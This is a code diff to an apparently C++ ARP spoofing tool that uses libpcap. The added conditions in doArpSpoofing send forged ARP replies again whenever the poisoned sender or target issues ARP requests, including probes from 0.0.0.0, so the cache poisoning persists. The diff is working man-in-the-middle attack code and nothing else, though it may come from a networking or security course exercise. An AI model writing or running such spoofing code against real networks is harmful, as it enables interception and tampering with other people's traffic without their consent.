@@ -218,6 +218,15 @@ void doArpSpoofing(char* dev, pcap_t* handle, std::vector<spoof_group>& spoof_gr
                      continue;
                  }
 
+
+                 if(EthArp_header->arp_.smac_ == i->sender_mac &&
+                         (std::string)EthArp_header->arp_.sip_=="0.0.0.0"){
+                     std::cout << "[*] Send ARP packet to Sender ... (Request)" << std::endl;
+                     std::cout << "[*] press ctrl + c to stop ..." << std::endl;
+                     send_arp_packet(handle, myMac, i->target_ip, i->sender_mac, i->sender_ip, ArpHdr::Reply);
+                     continue;
+                 }
+
                  if(EthArp_header->arp_.smac_ == i->target_mac &&
                          (uint32_t)EthArp_header->arp_.tip_.isBroadcast()){
                      std::cout << "[*] Send ARP packet to Sender ... (Broadcast)" << std::endl;
@@ -237,6 +246,22 @@ void doArpSpoofing(char* dev, pcap_t* handle, std::vector<spoof_group>& spoof_gr
                      std::cout << "[*] Send ARP packet to Sender ... (Broadcast)" << std::endl;
                      std::cout << "[*] press ctrl + c to stop ..." << std::endl;
                      send_arp_packet(handle, myMac, i->target_ip, i->sender_mac, i->sender_ip, ArpHdr::Reply);
+                     continue;
+                 }
+
+                 if(EthArp_header->arp_.smac_ == i->target_mac &&
+                         (uint32_t)EthArp_header->arp_.tip_ == htonl(i->sender_ip)){
+                     std::cout << "[*] Send ARP packet to Target ... (Request)" << std::endl;
+                     std::cout << "[*] press ctrl + c to stop ..." << std::endl;
+                     send_arp_packet(handle, myMac, i->sender_ip, i->target_mac, i->target_ip, ArpHdr::Reply);
+                     continue;
+                 }
+
+                 if(EthArp_header->arp_.smac_ == i->target_mac &&
+                         (std::string)EthArp_header->arp_.tip_ == "0.0.0.0"){
+                     std::cout << "[*] Send ARP packet to Target ... (Request)" << std::endl;
+                     std::cout << "[*] press ctrl + c to stop ..." << std::endl;
+                     send_arp_packet(handle, myMac, i->sender_ip, i->target_mac, i->target_ip, ArpHdr::Reply);
                      continue;
                  }
 
@@ -317,7 +342,7 @@ int main(int argc, char* argv[]) {
     }
 
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 0, errbuf);
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
     if (handle == nullptr) {
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
         return -1;
